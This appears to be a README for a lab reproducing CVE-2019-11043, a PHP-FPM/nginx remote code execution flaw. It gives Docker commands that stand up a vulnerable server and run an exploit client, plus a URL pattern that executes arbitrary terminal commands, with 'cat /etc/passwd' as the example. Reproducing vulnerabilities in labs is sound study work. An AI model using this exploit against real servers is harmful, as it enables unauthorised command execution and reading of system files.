# CVE-2019-11043

## About
* <https://nvd.nist.gov/vuln/detail/CVE-2019-11043>


## PoC / Exploit
* <https://github.com/ypereirareis/docker-CVE-2019-11043>
 

## Environment used

* Ubuntu 20.04 LTS

## Requirements
* Web browser 

## Reproduction
* Server
    - Docker version
        ```shell script
        docker run --rm -p 8080:80 -it simaofsilva/cve-2019-11043
        ```
    - Script version
        ```shell script
        sudo bash installation.sh
        (sudo nginx &) && (sudo /usr/local/sbin/php-fpm &) && sudo tail -f /var/log/nginx/*.log
        ```  

* Client
    - Docker version
      ```shell script
      docker run --rm -it simaofsilva/cve-2019-11043-client "http://SERVER_IP:8080/script.php"
      ```
      Open a browser and go to <http://SERVER_IP:8080/script.php?a=><b>CMD</b> where 
      CMD is terminal command. <br>
      
    - Script version
      ```shell script
      docker run --rm -it simaofsilva/cve-2019-11043-client "http://SERVER_IP:80/php-fpm/script.php"
      ```
      Open a browser and go to <http://SERVER_IP:80/php-fpm/script.php?a=><b>CMD</b> where 
      CMD is terminal command. <br>

&emsp;&emsp; E.g.: <http://127.0.0.1:8080/script.php?a=cat%20/etc/passwd>

<p align="center">
  <img src="https://raw.githubusercontent.com/ypereirareis/docker-CVE-2019-11043/master/img/exploit.jpg">
</p>    

Note: It is recommended to refresh the page if the command's output is not showing. 

## References
* <https://github.com/neex/phuip-fpizdam>
